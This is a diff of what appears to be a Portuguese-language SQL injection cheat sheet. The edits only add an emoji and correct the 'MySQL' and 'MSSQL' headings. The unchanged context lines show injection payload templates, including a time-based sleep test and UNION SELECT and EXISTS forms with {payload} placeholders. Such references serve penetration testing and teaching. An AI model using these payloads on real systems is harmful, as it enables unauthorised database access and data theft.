@@ -1,4 +1,4 @@
-SQL Injection é quando um atacante manipula consultas de bancos de dados através de um "ponto de entrada" na aplicação.
+:hamburger: SQL Injection é quando um atacante manipula consultas de bancos de dados através de um "ponto de entrada" na aplicação.
 
 :fries:Checklist
 
@@ -241,7 +241,7 @@ AND IF (1=1, sleep(3),'false') --
 ' AND EXISTS({payload})--
 ' OR EXISTS({payload})--
 ```
-#### MYSql 
+#### MySQL 
 ```
 ' UNION ALL SELECT {payload}--
 ' UNION SELECT {payload}--
@@ -270,7 +270,7 @@ AND IF (1=1, sleep(3),'false') --
 "||{payload}||"--
 '||(SELECT {payload} FROM dual)--
 ```
-#### MSSql 
+#### MSSQL
 ```
 ' UNION ALL SELECT {payload}--
 ' UNION SELECT {payload}--
